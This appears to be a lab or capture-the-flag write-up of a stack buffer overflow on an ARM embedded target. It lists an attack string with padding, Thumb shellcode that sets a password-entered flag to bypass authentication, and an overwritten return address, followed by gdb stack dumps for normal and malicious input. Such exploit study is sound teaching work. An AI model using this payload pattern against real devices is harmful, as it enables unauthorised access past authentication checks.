

    STRING		DESCRIPTION		INSTRUCTION		STACK LOCATION
---------------------------------------------------------------------------------------
"\xff\xff\xff"          //PAD BYTES                             	@0x200000cd-cf
"\x4f\xf0\x01\x00"      //mov  r0, #1           (0xf04f0001)    	@0x200000d0-d3
"\x40\xf2\x00\x11"      //movw r1, #256         (0xf2401100)    	@0x200000d4-d7
"\xc2\xf2\x00\x01"      //movt r1, #8192        (0xf2c20100)    	@0x200000d8-db
"\x08\x60"              //str  r0, [r1, #0]     (0x6008)        	@0x200000dc-dd
"\x40\xf2\x93\x10"      //movw r0, #403         (0xf2401193)    	@0x200000de-e1
"\x00\x47"              //bx   r1               (0x4700)        	@0x200000e2-e3
"\xff\xff\xff\xff"      //PAD BYTES                             	@0x200000e4-e7
"\xff\xff\xff\xff"      //PAD BYTES                             	@0x200000e8-eb
"\xff\xff\xff\xff"      //PAD BYTES                             	@0x200000ec-ef
"\xff\xff\xff\xff"      //PAD BYTES                             	@0x200000f0-f3
"\xd1\x00\x00\x20"      //Address of inst.      (0x200000d0)    	@0x200000f4-f7

Using "Harold":

(gdb) x/40x $sp
0x200000b0 <pulStack+176>:      0x00000000      0x636c6557      0x20656d6f      0x74206f74
0x200000c0 <pulStack+192>:      0x77206568      0x73206265      0x2c657469      0x72614820
0x200000d0 <pulStack+208>:      0x00646c6f      0x00000000      0x00000000      0x00000000
0x200000e0 <pulStack+224>:      0x00000000      0x00000000      0x5b0026aa      0x5e38b440
0x200000f0 <pulStack+240>:      0xa9004e70      0x00000193      0x00000000      0xffffffff
0x20000100 <gPasswordEntered>:  0x00000000      0x00000001      0x00000000      0x00000000
0x20000110:     0x000000f5      0x000000f5      0xe7fee7fe      0x2300e7fe
0x20000120:     0x490ae003      0x50995859      0x4a093304      0x18984909
0x20000130:     0xd3f64288      0x49094808      0x0200f04f      0xbfb84288
0x20000140:     0x2b04f840      0xf000dbfa      0xbf00b82d      0x00001190

Using Malicious Attack String:

(gdb) x/40x $sp
0x200000b0 <pulStack+176>:      0x00000000      0x636c6557      0x20656d6f      0x74206f74
0x200000c0 <pulStack+192>:      0x77206568      0x73206265      0x2c657469      0xffffff20
0x200000d0 <pulStack+208>:      0x0001f04f      0x1100f240      0x0100f2c2      0xffff6008
0x200000e0 <pulStack+224>:      0x70c9f44f      0xffff4700      0xffffffff      0xffffffff
0x200000f0 <pulStack+240>:      0xffffffff      0x00d02000      0x00000000      0xffffffff
0x20000100 <gPasswordEntered>:  0x00000000      0x00000001      0x00000000      0x00000000
0x20000110:     0x000000f5      0x000000f5      0xe7fee7fe      0x2300e7fe
0x20000120:     0x490ae003      0x50995859      0x4a093304      0x18984909
0x20000130:     0xd3f64288      0x49094808      0x0200f04f      0xbfb84288
0x20000140:     0x2b04f840      0xf000dbfa      0xbf00b82d      0x000011b4
